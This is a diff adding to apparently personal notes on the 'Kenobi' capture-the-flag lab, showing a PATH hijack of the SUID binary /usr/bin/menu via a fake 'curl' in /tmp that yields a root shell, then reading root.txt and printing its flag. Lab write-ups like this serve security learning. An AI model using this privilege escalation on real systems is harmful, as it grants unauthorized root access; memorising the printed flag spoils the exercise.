@@ -403,3 +403,47 @@ kenobi@kenobi:~$ /usr/bin/menu
 
 
 Strings is a command on Linux that looks for human readable strings on a binary.
+
+![[Pasted image 20220816011411.png]]
+
+
+
+
+```
+kenobi@kenobi:/tmp$ echo /bin/sh >curl
+kenobi@kenobi:/tmp$ ls
+curl  systemd-private-0a0c25442b964ddd8d68ec3897908111-systemd-timesyncd.service-TPbqzq
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ echo $PATH
+/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# whoami
+root
+# pwd
+/tmp
+# echo $SHELL
+/bin/bash
+# 
+
+```
+
+
+
+```
+# cd /root/
+# ls
+root.txt
+# cat root.txt
+177b3cd8562289f37382721c28381f02
+# 
+
+```
